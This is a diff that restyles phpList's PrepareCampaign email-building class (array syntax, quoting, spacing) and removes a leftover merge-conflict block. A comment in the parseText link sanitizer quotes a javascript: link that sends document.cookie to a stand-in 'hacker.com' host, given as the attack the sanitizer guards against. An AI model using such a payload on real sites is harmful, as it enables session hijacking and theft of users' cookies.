@@ -2,8 +2,8 @@
 namespace phpList\helper;
 
 use phpList\Attachment;
-use phpList\Config;
 use phpList\Campaign;
+use phpList\Config;
 use phpList\MailingList;
 use phpList\phpList;
 use phpList\phpListMailer;
@@ -16,13 +16,14 @@ class PrepareCampaign
      * @param Subscriber $subscriber
      * @param bool $is_test_mail
      * @param array $forwardedby
+     *
      * @return bool
      */
     public static function sendEmail(
         $campaign,
         $subscriber,
         $is_test_mail = false,
-        $forwardedby = array()
+        $forwardedby = []
     ) {
         $get_speed_stats = Config::VERBOSE && Config::get('getspeedstats', false) !== false && (Timer::get('process_queue') != null);
         $sql_count_start = phpList::DB()->getQueryCount();
@@ -68,7 +69,6 @@ class PrepareCampaign
 
         if ($get_speed_stats) {
             phpList::log()->debug('Load subscriber start', ['page' => 'preparecampaign']);
-            ;
         }
 
         #0011857: forward to friend, retain attributes
@@ -78,7 +78,7 @@ class PrepareCampaign
 
         $subscriber_att_values = $subscriber->getCleanAttributes();
 
-        $html = $text = array();
+        $html = $text = [];
         if (stripos($content, '[LISTS]') !== false) {
             $lists = MailingList::getListsForSubscriber($subscriber->id);
             if (!empty($lists)) {
@@ -94,13 +94,11 @@ class PrepareCampaign
 
         if ($get_speed_stats) {
             phpList::log()->debug('Load subscriber end', ['page' => 'preparecampaign']);
-            ;
         }
 
         if ($cached_campaign->subscriberpecific_url) {
             if ($get_speed_stats) {
                 phpList::log()->debug('fetch personal URL start', ['page' => 'preparecampaign']);
-                ;
             }
 
             ## Fetch external content, only if the URL has placeholders
@@ -117,7 +115,7 @@ class PrepareCampaign
                         $content = str_replace($regs[0], $remote_content, $content);
                         $cached_campaign->htmlformatted = strip_tags($content) != $content;
                     } else {
-                        phpList::log()->notice('Error fetching URL: '.$regs[1].' to send to ' . $subscriber->getEmailAddress());
+                        phpList::log()->notice('Error fetching URL: ' . $regs[1] . ' to send to ' . $subscriber->getEmailAddress());
                         return 0;
                     }
                     preg_match('/\[URL:([^\s]+)\]/i', $content, $regs);
@@ -125,13 +123,11 @@ class PrepareCampaign
             }
             if ($get_speed_stats) {
                 phpList::log()->debug('fetch personal URL end', ['page' => 'preparecampaign']);
-                ;
             }
         }
 
         if ($get_speed_stats) {
             phpList::log()->debug('define placeholders start', ['page' => 'preparecampaign']);
-            ;
         }
 
         //TODO: can't we precache parts of the urls and the just use string concatenation for better performance
@@ -267,14 +263,12 @@ class PrepareCampaign
 
         if ($get_speed_stats) {
             phpList::log()->debug('define placeholders end', ['page' => 'preparecampaign']);
-            ;
         }
 
         ## Fill text and html versions depending on given versions.
 
         if ($get_speed_stats) {
             phpList::log()->debug('parse text to html or html to text start', ['page' => 'preparecampaign']);
-            ;
         }
 
         if ($cached_campaign->htmlformatted) {
@@ -295,7 +289,6 @@ class PrepareCampaign
 
         if ($get_speed_stats) {
             phpList::log()->debug('parse text to html or html to text end', ['page' => 'preparecampaign']);
-            ;
         }
 
         $defaultstyle = Config::get('html_email_style');
@@ -303,7 +296,6 @@ class PrepareCampaign
 
         if ($get_speed_stats) {
             phpList::log()->debug('merge into template start', ['page' => 'preparecampaign']);
-            ;
         }
 
         if ($cached_campaign->template) {
@@ -318,13 +310,11 @@ class PrepareCampaign
 
         if ($get_speed_stats) {
             phpList::log()->debug('merge into template end', ['page' => 'preparecampaign']);
-            ;
         }
         ## Parse placeholders
 
         if ($get_speed_stats) {
             phpList::log()->debug('parse placeholders start', ['page' => 'preparecampaign']);
-            ;
         }
         ### @@@TODO don't use forward and forward form in a forwarded campaign as it'll fail
 
@@ -344,7 +334,6 @@ class PrepareCampaign
                ' . $html['signature']
             );
         }
-
 
         # END BUGFIX 0015303, 2/2
 
@@ -442,15 +431,13 @@ class PrepareCampaign
 
         if ($get_speed_stats) {
             phpList::log()->debug('parse placeholders end', ['page' => 'preparecampaign']);
-            ;
         }
 
         if ($get_speed_stats) {
             phpList::log()->debug('parse subscriberdata start', ['page' => 'preparecampaign']);
-            ;
         }
 
-        $subscriberdata = array();
+        $subscriberdata = [];
         foreach (Subscriber::$DB_ATTRIBUTES as $key) {
             $subscriberdata[$key] = $subscriber->$key;
         }
@@ -468,7 +455,6 @@ class PrepareCampaign
 
         if ($get_speed_stats) {
             phpList::log()->debug('parse subscriberdata end', ['page' => 'preparecampaign']);
-            ;
         }
 
         if (!$destinationemail) {
@@ -482,14 +468,12 @@ class PrepareCampaign
 
         if ($get_speed_stats) {
             phpList::log()->debug('pass to plugins for destination email start', ['page' => 'preparecampaign']);
-            ;
         }
 
         ## click tracking
         # for now we won't click track forwards, as they are not necessarily subscribers, so everything would fail
         if ($get_speed_stats) {
             phpList::log()->debug('click track start', ['page' => 'preparecampaign']);
-            ;
         }
 
         if (Config::CLICKTRACK && $subscriber->uniqid != 'forwarded') {
@@ -524,7 +508,7 @@ class PrepareCampaign
                 )) && (stripos($link, 'www.phplist.com') === false) && !strpos($link, $clicktrack_root)
                 ) {
                     # take off personal uids
-                    $url = Util::cleanUrl($link, array('PHPSESSID', 'uid'));
+                    $url = Util::cleanUrl($link, ['PHPSESSID', 'uid']);
 
                     $linkid = PrepareCampaign::clickTrackLinkId($campaign->id, $subscriber->id, $url, $link);
 
@@ -578,7 +562,7 @@ class PrepareCampaign
                         && (stripos($link, 'www.phplist.com') === false)
                         && !strpos($link, $clicktrack_root)
                     ) {
-                        $url = Util::cleanUrl($link, array('PHPSESSID', 'uid'));
+                        $url = Util::cleanUrl($link, ['PHPSESSID', 'uid']);
                         phpList::DB()->query(sprintf(
                             'INSERT IGNORE INTO %s (campaignid, userid, url, forward)
                                  VALUES(%d, %d, "%s", "%s")',
@@ -621,7 +605,7 @@ class PrepareCampaign
             preg_match_all('#(https?://[^\s\>\}\,]+)#mis', $textcampaign, $links);
             ## sort the results in reverse order, so that they are replaced correctly
             rsort($links[1]);
-            $newlinks = array();
+            $newlinks = [];
 
             for ($i = 0; $i < count($links[1]); $i++) {
                 $link = Util::cleanUrl($links[1][$i]);
@@ -633,7 +617,7 @@ class PrepareCampaign
                 if (preg_match('/^http|ftp/', $link)
                     && stripos($link, 'www.phplist.com') === false
                 ) {
-                    $url = Util::cleanUrl($link, array('PHPSESSID', 'uid'));
+                    $url = Util::cleanUrl($link, ['PHPSESSID', 'uid']);
 
                     $linkid = PrepareCampaign::clickTrackLinkId($campaign->id, $subscriber->id, $url, $link);
 
@@ -668,7 +652,6 @@ class PrepareCampaign
         }
         if ($get_speed_stats) {
             phpList::log()->debug('click track end', ['page' => 'preparecampaign']);
-            ;
         }
 
         ## if we're not tracking clicks, we should add Google tracking here
@@ -698,7 +681,7 @@ class PrepareCampaign
 
             preg_match_all('#(https?://[^\s\>\}\,]+)#mis', $textcampaign, $links);
             rsort($links[1]);
-            $newlinks = array();
+            $newlinks = [];
 
             for ($i = 0; $i < count($links[1]); $i++) {
                 $link = Util::cleanUrl($links[1][$i]);
@@ -738,7 +721,6 @@ class PrepareCampaign
         }
         if ($get_speed_stats) {
             phpList::log()->debug('cleanup start', ['page' => 'preparecampaign']);
-            ;
         }
 
         ## allow fallback to default value for the ones that do not have a value
@@ -755,18 +737,18 @@ class PrepareCampaign
 
         # check that the HTML campaign as proper <head> </head> and <body> </body> tags
         # some readers fail when it doesn't
-        if (!preg_match("#<body.*</body>#ims", $htmlcampaign)) {
+        if (!preg_match('#<body.*</body>#ims', $htmlcampaign)) {
             $htmlcampaign = '<body>' . $htmlcampaign . '</body>';
         }
-        if (!preg_match("#<head.*</head>#ims", $htmlcampaign)) {
+        if (!preg_match('#<head.*</head>#ims', $htmlcampaign)) {
             if (!$adddefaultstyle) {
-                $defaultstyle = "";
+                $defaultstyle = '';
             }
             $htmlcampaign = '<head>
         <meta content="text/html;charset=' . $cached_campaign->html_charset . '" http-equiv="Content-Type">
         <title></title>' . $defaultstyle . '</head>' . $htmlcampaign;
         }
-        if (!preg_match("#<html.*</html>#ims", $htmlcampaign)) {
+        if (!preg_match('#<html.*</html>#ims', $htmlcampaign)) {
             $htmlcampaign = '<html>' . $htmlcampaign . '</html>';
         }
 
@@ -779,7 +761,6 @@ class PrepareCampaign
 
         if ($get_speed_stats) {
             phpList::log()->debug('cleanup end', ['page' => 'preparecampaign']);
-            ;
         }
 
         if ($get_speed_stats) {
@@ -791,13 +772,13 @@ class PrepareCampaign
         if ($forwardedby) {
             $mail->add_timestamp();
         }
-        $mail->addCustomHeader("List-Help: <" . $text['preferences'] . ">");
-        $mail->addCustomHeader("List-Unsubscribe: <" . $text['jumpoffurl'] . ">");
-        $mail->addCustomHeader("List-Subscribe: <" . Config::get("subscribeurl") . ">");
-        $mail->addCustomHeader("List-Owner: <mailto:" . Config::get("admin_address") . ">");
+        $mail->addCustomHeader('List-Help: <' . $text['preferences'] . '>');
+        $mail->addCustomHeader('List-Unsubscribe: <' . $text['jumpoffurl'] . '>');
+        $mail->addCustomHeader('List-Subscribe: <' . Config::get('subscribeurl') . '>');
+        $mail->addCustomHeader('List-Owner: <mailto:' . Config::get('admin_address') . '>');
 
         list($dummy, $domaincheck) = explode('@', $destinationemail);
-        $text_domains = explode("\n", trim(Config::get("alwayssendtextto")));
+        $text_domains = explode("\n", trim(Config::get('alwayssendtextto')));
         if (in_array($domaincheck, $text_domains)) {
             $subscriber->htmlemail = 0;
             if (Config::VERBOSE) {
@@ -807,7 +788,7 @@ class PrepareCampaign
 
         # so what do we actually send?
         switch ($cached_campaign->sendformat) {
-            case "PDF":
+            case 'PDF':
                 # send a PDF file to subscribers who want html and text to everyone else
                 if ($subscriber->htmlemail) {
                     if (!$is_test_mail) {
@@ -816,7 +797,7 @@ class PrepareCampaign
                     }
                     $pdffile = PrepareCampaign::createPdf($textcampaign);
                     if (is_file($pdffile) && filesize($pdffile)) {
-                        $fp = fopen($pdffile, "r");
+                        $fp = fopen($pdffile, 'r');
                         if ($fp) {
                             $contents = fread($fp, filesize($pdffile));
                             fclose($fp);
@@ -834,12 +815,12 @@ class PrepareCampaign
                             #$mail->add_text($textcampaign);
                             $mail->addAttachment(
                                 $contents,
-                                "campaign.pdf",
-                                "application/pdf"
+                                'campaign.pdf',
+                                'application/pdf'
                             );
                         }
                     }
-                    PrepareCampaign::addAttachments($campaign, $mail, "HTML");
+                    PrepareCampaign::addAttachments($campaign, $mail, 'HTML');
                 } else {
                     if (!$is_test_mail) {
                         phpList::DB()->query(
@@ -847,10 +828,10 @@ class PrepareCampaign
                         );
                     }
                     $mail->add_text($textcampaign);
-                    PrepareCampaign::addAttachments($campaign, $mail, "text");
+                    PrepareCampaign::addAttachments($campaign, $mail, 'text');
                 }
                 break;
-            case "text and PDF":
+            case 'text and PDF':
                 # send a PDF file to subscribers who want html and text to everyone else
                 if ($subscriber->htmlemail) {
                     if (!$is_test_mail) {
@@ -860,7 +841,7 @@ class PrepareCampaign
                     }
                     $pdffile = PrepareCampaign::createPDF($textcampaign);
                     if (is_file($pdffile) && filesize($pdffile)) {
-                        $fp = fopen($pdffile, "r");
+                        $fp = fopen($pdffile, 'r');
                         if ($fp) {
                             $contents = fread($fp, filesize($pdffile));
                             fclose($fp);
@@ -877,12 +858,12 @@ class PrepareCampaign
                             $mail->add_text($textcampaign);
                             $mail->add_attachment(
                                 $contents,
-                                "campaign.pdf",
-                                "application/pdf"
+                                'campaign.pdf',
+                                'application/pdf'
                             );
                         }
                     }
-                    PrepareCampaign::addAttachments($campaign, $mail, "HTML");
+                    PrepareCampaign::addAttachments($campaign, $mail, 'HTML');
                 } else {
                     if (!$is_test_mail) {
                         phpList::DB()->query(
@@ -890,20 +871,20 @@ class PrepareCampaign
                         );
                     }
                     $mail->add_text($textcampaign);
-                    PrepareCampaign::addAttachments($campaign, $mail, "text");
+                    PrepareCampaign::addAttachments($campaign, $mail, 'text');
                 }
                 break;
-            case "text":
+            case 'text':
                 # send as text
                 if (!$is_test_mail) {
                     phpList::DB()->query("UPDATE {Config::getTableName('message')} SET astext = astext + 1 WHERE id = $campaign->id");
                 }
                 $mail->add_text($textcampaign);
-                PrepareCampaign::addAttachments($campaign, $mail, "text");
+                PrepareCampaign::addAttachments($campaign, $mail, 'text');
                 break;
-            case "both":
-            case "text and HTML":
-            case "HTML":
+            case 'both':
+            case 'text and HTML':
+            case 'HTML':
             default:
                 $handled_by_plugin = 0;
                 if (!$handled_by_plugin) {
@@ -922,7 +903,7 @@ class PrepareCampaign
                             $htmlcampaign = wordwrap($htmlcampaign, Config::WORDWRAP_HTML, "\r\n");
                         }
                         $mail->add_html($htmlcampaign, $textcampaign, $cached_campaign->templateid);
-                        PrepareCampaign::addAttachments($campaign, $mail, "HTML");
+                        PrepareCampaign::addAttachments($campaign, $mail, 'HTML');
                     } else {
                         if (!$is_test_mail) {
                             phpList::DB()->query(
@@ -930,7 +911,7 @@ class PrepareCampaign
                             );
                         }
                         $mail->add_text($textcampaign);
-                        PrepareCampaign::addAttachments($campaign, $mail, "text");
+                        PrepareCampaign::addAttachments($campaign, $mail, 'text');
                     }
                 }
                 break;
@@ -962,14 +943,6 @@ class PrepareCampaign
             }
 
             if (!$mail->compatSend('', $destinationemail, $fromname, $fromemail, $subject)) {
-<<<<<<< 1231399686352d6e330e138c3124856b15d06226
-                #if (!$mail->send(array($destinationemail),'spool')) {
-                /*TODO: enable plugins
-                foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
-                    $plugin->processSendFailed($campaign->id, $subscriberdata, $isTestMail);
-                }*/
-=======
->>>>>>> [CLEANUP] Delete commented-out code
                 phpList::log()->debug(
                     sprintf(
                         s('Error sending campaign %d (%d/%d) to %s (%s) '),
@@ -1013,7 +986,7 @@ class PrepareCampaign
     {
         if (Config::ALLOW_ATTACHMENTS) {
             $attachments = $campaign->getAttachments();
-            if ($type == "text") {
+            if ($type == 'text') {
                 $mail->append_text(s('This campaign contains attachments that can be viewed with a webbrowser:') . "\n");
             }
 
@@ -1023,9 +996,9 @@ class PrepareCampaign
             foreach ($attachments as $attachment) {
                 $file = Config::ATTACHMENT_REPOSITORY . '/' . $attachment->filename;
                 switch ($type) {
-                    case "HTML":
+                    case 'HTML':
                         if (is_file($file) && filesize($file)) {
-                            $fp = fopen($file, "r");
+                            $fp = fopen($file, 'r');
                             if ($fp) {
                                 $contents = fread($fp, filesize($file));
                                 fclose($fp);
@@ -1049,7 +1022,7 @@ class PrepareCampaign
                                 list($name, $ext) = explode('.', basename($attachment->remotefile));
                                 # create a temporary file to make sure to use a unique file name to store with
                                 $newfile = tempnam(Config::ATTACHMENT_REPOSITORY, $name);
-                                $newfile .= "." . $ext;
+                                $newfile .= '.' . $ext;
                                 $newfile = basename($newfile);
                                 $fd = fopen(Config::ATTACHMENT_REPOSITORY . '/' . $newfile, 'w');
                                 fwrite($fd, $contents);
@@ -1085,10 +1058,10 @@ class PrepareCampaign
                         }
                         break;
 
-                    case "text":
-                        $viewurl = Config::get('public_scheme') . "://" . Config::get('website') . Config::PAGEROOT . '/dl.php?id=' . $attachment->id;
+                    case 'text':
+                        $viewurl = Config::get('public_scheme') . '://' . Config::get('website') . Config::PAGEROOT . '/dl.php?id=' . $attachment->id;
                         $mail->append_text(
-                            $attachment->description . "\n" . s('Location') . ": " . $viewurl . "\n"
+                            $attachment->description . "\n" . s('Location') . ': ' . $viewurl . "\n"
                         );
                         break;
                 }
@@ -1145,17 +1118,17 @@ class PrepareCampaign
 
         $uparts = @parse_url($p_url);
 
-        $scheme = array_key_exists('scheme', $uparts) ? $uparts['scheme'] : "";
-        $pass = array_key_exists('pass', $uparts) ? $uparts['pass'] : "";
-        $subscriber = array_key_exists('user', $uparts) ? $uparts['user'] : "";
-        $port = array_key_exists('port', $uparts) ? $uparts['port'] : "";
-        $host = array_key_exists('host', $uparts) ? $uparts['host'] : "";
-        $path = array_key_exists('path', $uparts) ? $uparts['path'] : "";
-        $query = array_key_exists('query', $uparts) ? $uparts['query'] : "";
-        $fragment = array_key_exists('fragment', $uparts) ? $uparts['fragment'] : "";
+        $scheme = array_key_exists('scheme', $uparts) ? $uparts['scheme'] : '';
+        $pass = array_key_exists('pass', $uparts) ? $uparts['pass'] : '';
+        $subscriber = array_key_exists('user', $uparts) ? $uparts['user'] : '';
+        $port = array_key_exists('port', $uparts) ? $uparts['port'] : '';
+        $host = array_key_exists('host', $uparts) ? $uparts['host'] : '';
+        $path = array_key_exists('path', $uparts) ? $uparts['path'] : '';
+        $query = array_key_exists('query', $uparts) ? $uparts['query'] : '';
+        $fragment = array_key_exists('fragment', $uparts) ? $uparts['fragment'] : '';
 
         if (!empty($scheme)) {
-            if ($scheme == "mailto") {
+            if ($scheme == 'mailto') {
                 $scheme .= ':';
             } else {
                 $scheme .= '://';
@@ -1175,13 +1148,13 @@ class PrepareCampaign
 
         if (!empty($path)) {
             $arr = preg_split("/([\/;=@])/", $path, -1, PREG_SPLIT_DELIM_CAPTURE); // needs php > 4.0.5.
-            $path = "";
+            $path = '';
             foreach ($arr as $var) {
                 switch ($var) {
-                    case "/":
-                    case ";":
-                    case "=":
-                    case "@":
+                    case '/':
+                    case ';':
+                    case '=':
+                    case '@':
                         $path .= $var;
                         break;
                     default:
@@ -1189,14 +1162,14 @@ class PrepareCampaign
                 }
             }
             // legacy patch for servers that need a literal /~username
-            $path = str_replace("/%7E", "/~", $path);
+            $path = str_replace('/%7E', '/~', $path);
         }
 
         if (!empty($query)) {
-            $arr = preg_split("/([&=])/", $query, -1, PREG_SPLIT_DELIM_CAPTURE); // needs php > 4.0.5.
-            $query = "?";
+            $arr = preg_split('/([&=])/', $query, -1, PREG_SPLIT_DELIM_CAPTURE); // needs php > 4.0.5.
+            $query = '?';
             foreach ($arr as $var) {
-                if ("&" == $var || "=" == $var) {
+                if ('&' == $var || '=' == $var) {
                     $query .= $var;
                 } else {
                     $query .= rawurlencode($var);
@@ -1208,7 +1181,7 @@ class PrepareCampaign
             $fragment = '#' . urlencode($fragment);
         }
 
-        return implode('', array($scheme, $subscriber, $pass, $host, $port, $path, $query, $fragment));
+        return implode('', [$scheme, $subscriber, $pass, $host, $port, $path, $query, $fragment]);
     }
 
     public static function encodeLinks($text)
@@ -1255,7 +1228,7 @@ class PrepareCampaign
         }
 
         if (!isset($cache->linktrack_sent_cache[$campaign_id]) || !is_array($cache->linktrack_sent_cache[$campaign_id])) {
-            $cache->linktrack_sent_cache[$campaign_id] = array();
+            $cache->linktrack_sent_cache[$campaign_id] = [];
         }
         if (!isset($cache->linktrack_sent_cache[$campaign_id][$fwdid])) {
             $result = phpList::DB()->query(sprintf(
@@ -1310,7 +1283,7 @@ class PrepareCampaign
         return $fwdid;
     }
 
-    private static function parsePlaceHolders($content, $array = array())
+    private static function parsePlaceHolders($content, $array = [])
     {
         ## the editor turns all non-ascii chars into the html equivalent so do that as well
         foreach ($array as $key => $val) {
@@ -1335,7 +1308,6 @@ class PrepareCampaign
         return $content;
     }
 
-
     private static function parseText($text)
     {
         # bug in PHP? get rid of newlines at the beginning of text
@@ -1343,20 +1315,20 @@ class PrepareCampaign
 
         # make urls and emails clickable
         $text = preg_replace("/([\._a-z0-9-]+@[\.a-z0-9-]+)/i", '<a href="mailto:\\1" class="email">\\1</a>', $text);
-        $link_pattern="/(.*)<a.*href\s*=\s*\"(.*?)\"\s*(.*?)>(.*?)<\s*\/a\s*>(.*)/is";
+        $link_pattern = "/(.*)<a.*href\s*=\s*\"(.*?)\"\s*(.*?)>(.*?)<\s*\/a\s*>(.*)/is";
 
-        $i=0;
-        $link = array();
+        $i = 0;
+        $link = [];
         while (preg_match($link_pattern, $text, $matches)) {
-            $url=$matches[2];
+            $url = $matches[2];
             $rest = $matches[3];
-            if (!preg_match("/^(http:)|(mailto:)|(ftp:)|(https:)/i", $url)) {
+            if (!preg_match('/^(http:)|(mailto:)|(ftp:)|(https:)/i', $url)) {
                 # avoid this
                 #<a href="javascript:window.open('http://hacker.com?cookie='+document.cookie)">
-                $url = preg_replace("/:/", "", $url);
+                $url = preg_replace('/:/', '', $url);
             }
-            $link[$i]= '<a href="'.$url.'" '.$rest.'>'.$matches[4].'</a>';
-            $text = $matches[1]."%%$i%%".$matches[5];
+            $link[$i] = '<a href="' . $url . '" ' . $rest . '>' . $matches[4] . '</a>';
+            $text = $matches[1] . "%%$i%%" . $matches[5];
             $i++;
         }
 
@@ -1382,7 +1354,7 @@ class PrepareCampaign
             $text
         );
 
-        for ($j = 0; $j<$i; $j++) {
+        for ($j = 0; $j < $i; $j++) {
             $replacement = $link[$j];
             $text = preg_replace('/\%\%$j\%\%/', $replacement, $text);
         }
@@ -1412,14 +1384,16 @@ class PrepareCampaign
 
     /**
      * Add the footer
+     *
      * @param string $campaign
      * @param string $footer
+     *
      * @return string
      */
     private static function addHTMLFooter($campaign, $footer)
     {
         if (preg_match('#</body>#imUx', $campaign)) {
-            $campaign = preg_replace('#</body>#', $footer.'</body>', $campaign);
+            $campaign = preg_replace('#</body>#', $footer . '</body>', $campaign);
         } else {
             $campaign .= $footer;
         }
@@ -1428,8 +1402,10 @@ class PrepareCampaign
 
     /**
      * Load campaign in memory cache
+     *
      * @param Campaign $campaign
      * @param bool $forwardContent
+     *
      * @return bool
      */
     public static function precacheCampaign($campaign, $forwardContent = false)
@@ -1446,7 +1422,7 @@ class PrepareCampaign
             $campaign->replyto = str_replace($regs[0], '', $campaign->replyto);
             $cached_campaign->replytoemail = $regs[0];
             # if the email has < and > take them out here
-            $cached_campaign->replytoemail = str_replace(array('<', '>'), '', $cached_campaign->replytoemail);
+            $cached_campaign->replytoemail = str_replace(['<', '>'], '', $cached_campaign->replytoemail);
             # make sure there are no quotes around the name
             $cached_campaign->replytoname = str_replace('"', '', ltrim(rtrim($campaign->replyto)));
         } elseif (strpos($campaign->replyto, ' ')) {
@@ -1508,7 +1484,7 @@ class PrepareCampaign
                     );
                     $cached_campaign->htmlformatted = strip_tags($remote_content) != $remote_content;
                 } else {
-                    phpList::log()->notice("Error fetching URL: " . $campaign->sendurl . ' cannot proceed');
+                    phpList::log()->notice('Error fetching URL: ' . $campaign->sendurl . ' cannot proceed');
                     return false;
                 }
             }
@@ -1525,7 +1501,7 @@ class PrepareCampaign
         if (Config::VERBOSE && (Config::get('getspeedstats', false) !== false)) {
             phpList::log()->debug('parse config end', ['page' => 'preparecampaign']);
         }
-        if (preg_match("/##LISTOWNER=(.*)/", $cached_campaign->content, $regs)) {
+        if (preg_match('/##LISTOWNER=(.*)/', $cached_campaign->content, $regs)) {
             $cached_campaign->listowner = $regs[1];
             $cached_campaign->content = str_replace($regs[0], '', $cached_campaign->content);
         } else {
